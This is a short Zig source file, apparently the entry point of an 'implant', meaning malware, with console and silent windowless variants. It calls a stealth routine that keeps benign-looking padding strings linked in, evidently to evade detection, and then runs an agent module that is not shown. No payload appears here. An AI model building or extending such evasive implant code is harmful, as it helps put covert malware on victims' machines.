//! zig-implant entry point. The console and silent (GUI-subsystem) variants
//! share this root source; the subsystem is a build property (see build.zig).

const std = @import("std");
const agent = @import("agent.zig");
const stealth = @import("stealth.zig");

pub fn main() void {
    // Touch the benign-string padding so the optimizer keeps this module (and
    // the exported `benign_padding` blob) linked in under LTO.
    stealth.touch();
    agent.run() catch {};
}
